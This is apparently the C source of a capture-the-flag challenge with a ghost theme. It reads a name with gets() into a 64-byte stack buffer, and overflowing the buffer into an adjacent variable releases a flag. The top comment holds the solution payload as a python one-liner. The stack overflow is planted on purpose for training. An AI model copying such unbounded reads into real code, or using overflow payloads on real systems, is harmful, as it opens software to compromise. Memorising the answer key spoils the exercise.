// sol: python3 -c 'print("a"*72 + "\x11\x11\x10\x11\x11\x10\x01\x11")' | ./bin/one

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

const char* ghost_art =
"                        _________\n"
"                _.--'''  _   _   _--._\n"
"            _.-' _  /\\  (_  |_) |_   _`-.,\n"
"          .'    /  /--\\ ._) |   |_  |_)  ` .\n"
"        .'      \\_.  _.--'''''--..  | \\     '.\n"
"      ,'        _,-'   _..--''--..`'-.        `.\n"
"     /        .'     .'            `'. `.       `.\n"
"    /       .'     .'                 '. `.       \\\n"
"   /      .'      /        . _          \\  `.      \\\n"
"  ;      /       ;        / / `       .-.'   \\      ;\n"
"  |     '       ;           '            |    '      |\n"
" ;     ;        |             _       _   .    |.-.   ;\n"
" |     |        '            / `\\   .' \\  |    / / __.-.\n"
".'    |          \\           '   ;  |  | ;   .' _`'--/`|\n"
"|     |           \\           \\-.|  |-.'/ _.'  '   -' /\n"
"|     ;            `.         _\\_| _'_/(-'    .'`'--'` |\n"
"' ___ '.             `.       _,  ' `   \\    /  | ___  ;\n"
" | |   |        ,''-._ `-.     |`-._    ;  .'   '  |  |\n"
" ; |   ;       /      `'-'\\    `-'   _.' .'    ;  _|  '\n"
"  | |_| \\     ;            `    .--'` _.'      / (_  ;\n"
"  ; | | _\\    |     _.             |-'        /_  _) '\n"
"   \\   |_ '. _\\   /`'              ;        .'/ \\   '\n"
"    \\  |_   `._   \\                '      _'  \\_/  /\n"
"     '      _ '`| /               /     ._  |_|  ,'\n"
"      `.   |_  _ '-._           .'    ,'/ _ | | .\n"
"        '. |  |_) .  `_-._.____'_ .-'   \\_/   .'\n"
"          `.  | \\ |  |_ .     _  |  \\_/     .'\n"
"            `-._  |  |_ |\\ | | \\ |_  |  _.-'\n"
"                ''-._   ' \\| |_/   _..-'\n"
"                     `'''------'''`\n";

const unsigned long long target_val = 0x1101101111101111ULL;

void print_flag() {
    FILE *fp;
    char flag_buffer[256];

    fp = fopen("flag.txt", "r");

    if (fp == NULL) {
        printf("Oh no! Casper looked for the flag treat in 'flag.txt', but couldn't find it!\n");

        return;
    }

    if (fgets(flag_buffer, sizeof(flag_buffer), fp) != NULL) {
        flag_buffer[strcspn(flag_buffer, "\n")] = 0;

        printf("The ethereal message materializes into a flag from the beyond: %s\n", flag_buffer);
    } else {
        printf("Casper found 'flag.txt', but it seems to be empty or unreadable. Spooky!\n");
    }

    fclose(fp);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    char buffer[64];
    unsigned long long secret_code = 0ULL;

    printf("%s\n", ghost_art);
    printf("Welcome, brave soul, to the realm of the 'Friendly Ghost in the Shell(code)'!\n");
    printf("Casper has left a secret message, but it's a bit... ethereal.\n");
    printf("He says if you can make his secret code appear, you'll get a treat!\n");
    printf("What's your name?:\n> ");

    gets(buffer);

    printf("\nWooOooOoo, %s! Casper likes your name!\n", buffer);

    if (secret_code == target_val) {
        printf("\nBOO! You did it! Casper is so impressed!\n");
        printf("The ethereal message materializes into a flag:\n");
        print_flag();
    } else {
        printf("\nAww, shucks. The secret code is still a ghostly 0x%llx.\n", secret_code);
        printf("Casper was hoping for 0x%llx. Maybe try to be a bit more... fill it to the brim so it flows over maybe?\n", target_val);
    }

    printf("\nThanks for playing!\n");
    return 0;
}
